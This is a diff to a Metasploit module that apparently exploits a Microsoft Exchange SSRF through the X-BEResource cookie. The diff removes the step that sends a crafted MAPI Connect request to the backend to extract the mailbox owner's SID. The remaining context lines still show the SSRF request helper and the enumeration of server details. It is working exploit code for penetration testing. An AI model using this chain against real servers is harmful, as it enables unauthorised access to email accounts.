@@ -202,20 +202,6 @@ class MetasploitModule < Msf::Auxiliary
     return([server, legacy_dn, owa_urls])
   end
 
-  def request_mapi(server_name, legacy_dn, server_id)
-    mapi_data = "#{legacy_dn}\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"
-
-    sid = ''
-    response = send_mapi(mapi_data, "Admin@#{server_name}:444/mapi/emsmdb?MailboxId=#{server_id}&a=~1942062522")
-    if response.code == 200 && response.body =~ /act as owner of a UserMailbox/
-      sid_regex = /S-[0-9]{1}-[0-9]{1}-[0-9]{2}-[0-9]{10}-[0-9]{9}-[0-9]{10}-[0-9]{3,4}/
-      sid = response.body.match(sid_regex)
-    end
-    fail_with(Failure::Unknown, 'No \'SID\' was found') if sid.to_s.empty?
-
-    sid
-  end
-
   def send_http(method, ssrf, data = '', ctype = 'application/x-www-form-urlencoded')
     request = {
       'method' => method,
@@ -224,26 +210,6 @@ class MetasploitModule < Msf::Auxiliary
       'ctype' => ctype
     }
     request = request.merge({'data' => data}) unless data.empty?
-
-    received = send_request_cgi(request)
-    fail_with(Failure::Unknown, 'Server did not respond in an expected way') unless received
-
-    received
-  end
-
-  def send_mapi(data, ssrf)
-    request = {
-      'method' => 'POST',
-      'uri' => @random_uri,
-      'cookie' => "X-BEResource=#{ssrf};",
-      'ctype' => 'application/mapi-http',
-      'headers' => {
-        'X-Requesttype' => 'Connect',
-        'X-Requestid' => "#{Rex::Text.rand_text_numeric(12..13)}",
-        'X-Clientapplication' => 'Outlook/15.0.4815.1002'
-      },
-      'data' => data
-    }
 
     received = send_request_cgi(request)
     fail_with(Failure::Unknown, 'Server did not respond in an expected way') unless received
@@ -419,11 +385,6 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status(" * Server: #{server_id}")
     print_status(" * LegacyDN: #{legacy_dn}")
-
-    # get the user UID using mapi request.
-    print_status(message('Sending mapi request'))
-    sid = request_mapi(server_name, legacy_dn, server_id)
-    print_status(" * sid: #{sid} (#{datastore['EMAIL']})")
 
     # selecting target
     print_status(message('Selecting the first internal server found'))
